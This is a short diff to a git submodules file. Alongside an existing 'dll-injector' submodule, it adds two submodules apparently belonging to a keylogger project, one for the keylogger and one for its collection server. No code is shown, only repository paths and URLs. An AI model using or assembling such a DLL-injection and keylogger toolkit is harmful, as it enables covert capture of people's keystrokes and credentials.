@@ -1,3 +1,9 @@
 [submodule "dll-injector"]
 	path = dll-injector
 	url = https://github.com/x03xd/injector.git
+[submodule "servers"]
+	path = servers
+	url = https://github.com/x03xd/keyloggerService.git
+[submodule "keylogger"]
+	path = keylogger
+	url = https://github.com/x03xd/keylogger.git
